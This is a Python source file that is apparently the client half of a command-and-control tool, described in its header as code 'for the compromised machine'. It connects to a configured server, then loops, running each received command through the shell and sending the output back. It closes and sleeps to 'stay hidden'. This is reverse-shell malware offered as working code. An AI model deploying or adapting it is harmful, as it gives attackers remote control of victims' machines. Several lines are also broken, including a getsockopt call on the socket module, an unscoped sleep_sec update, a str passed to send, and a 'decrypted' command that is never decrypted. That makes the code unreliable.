# client.py - For the compromised machine

import socket
import subprocess
import time

import configuration as config  # Import configuration file

# CONSTANTS & GLOBALS
ADDRESS = (config.SERVER_ADDR, config.SERVER_PORT)
CONNECTION_TIMEOUT = 10
MAX_SLEEP = 3 * 60  # Upper bound of three minutes
sleep_sec = 10

########################
# CODE BEGINS
########################

# Sleep
# time.sleep(sleep_sec)

# Create a socket to connect to the server
connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection_socket.settimeout(CONNECTION_TIMEOUT)
# connection_socket.connect(ADDRESS)

# Determine if the connection is live
def is_socket_connected():
    try:
        unix_exit_code = socket.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
        print(unix_exit_code)
        return True if unix_exit_code == 0 else False
    except socket.error as e:
        print("error: ", e)
        return False  # Catch any errors from checking the socket status

# Connect to the server or sleep
def sleep_or_connect():
    while not is_socket_connected():
        try:
            print("result: ", is_socket_connected())
            time.sleep(2)
            connection_socket.connect(ADDRESS)
        except socket.timeout:
            # Sleep for twice the previous amound and try again
            sleep_sec = min(sleep_sec * 2, MAX_SLEEP)
            # time.sleep(sleep_sec)

sleep_or_connect()

# Receive the debug message
message = connection_socket.recv(config.PAYLOAD_SIZE).decode()
print("Debug message: ", message)

# Client REPL loop - run the interactive shell
while True:
    # Receive command from the C2 server
    decrypted_command = connection_socket.recv(config.PAYLOAD_SIZE).decode()
    if decrypted_command == "exit" or decrypted_command == "hangup":
        # Go back into the sleep cycle, stay hidden
        connection_socket.close()
        time.sleep(MAX_SLEEP)
        sleep_or_connect()
        continue
    # Execute the command
    shell_output = subprocess.getoutput(decrypted_command)
    # Send the results to the server
    connection_socket.send(shell_output)
